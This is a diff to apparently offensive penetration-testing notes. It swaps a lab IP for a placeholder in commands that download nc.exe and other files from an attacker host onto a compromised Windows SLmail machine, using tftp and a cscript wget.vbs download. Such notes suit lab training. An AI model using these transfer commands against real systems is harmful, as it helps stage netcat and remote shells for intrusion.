@@ -13,8 +13,8 @@ root@kali:# cp /usr/share/windows-binaries/nc.exe /tftp/
 
 Windows Box (defender)
 ```
-C:\Program Files\SLmail\System>tftp -i 10.11.0.138 GET nc.exe
-   tftp -i 10.11.0.138 GET nc.exe
+C:\Program Files\SLmail\System>tftp -i YO.UR.IP.ADD GET nc.exe
+   tftp -i YO.UR.IP.ADD GET nc.exe
    Transfer successful: 59392 bytes in 18 second(s), 3299 bytes/s
 ```
 
@@ -48,7 +48,7 @@ service apache2 start
 
 Windows (Defender) - Paste `wget-vbs.txt` into the shell then use
 ```
-cscript wget.vbs http://10.11.0.138/test.txt testvbs.txt
+cscript wget.vbs http://YO.UR.IP.ADD/test.txt testvbs.txt
 ```
 
 ## Powershell
